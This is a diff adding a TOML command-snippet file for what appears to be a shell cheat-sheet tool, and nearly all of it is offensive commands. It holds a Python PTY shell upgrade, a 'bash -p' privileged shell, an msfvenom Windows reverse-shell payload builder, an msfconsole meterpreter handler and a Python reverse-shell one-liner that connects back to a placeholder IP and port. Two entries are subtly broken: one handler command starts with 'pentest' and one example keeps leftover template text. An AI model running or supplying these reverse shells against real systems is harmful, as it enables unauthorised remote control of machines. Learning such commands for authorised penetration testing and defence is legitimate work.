@@ -1,0 +1,41 @@
+[command.UpgradeShell]
+use_name = "shell"
+local = true
+cmd_types = "sysadmin"
+short_desc = "Upgrade shell for more flexibility"
+args = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+examples = [
+    "python3 -c 'import os; os.system(\"/bin/bash -p\")'",
+    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+]
+
+[command.Msfvenom]
+use_name = "msfvenom"
+local = true
+cmd_types = "pentest"
+short_desc = "Create reverse shell tcp"
+args = "msfvenom -p <payload|windows/shell_reverse_tcp> LHOST=<ip|127.0.0.1> LPORT=<port|4444> -f <type|exe> > reverse_tcp.exe"
+examples = [
+    "msfvenom -p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
+]
+
+[command.Msfconsole]
+use_name = "msfconsole"
+local = true
+cmd_types = "pentest"
+short_desc = "Handler reverse shell tcp"
+args = "pentest -q -x 'use exploit/multi/handler;set payload <PAYLOAD|windows/meterpreter/reverse_tcp> ;set LHOST <LHOST|127.0.0.1> ;set LPORT <LPORT|4444> ;run;'"
+examples = [
+    "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 4444;run;'"
+]
+
+[command.ConnectBack]
+use_name = "shell"
+local = false
+cmd_types = "pentest|network|linux"
+short_desc = "reverse shell - connect back and spawn a clean terminal with python subprocess"
+args = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\" <ip|127.0.0.1> \", <port|4444> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+examples = [
+    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+]
+
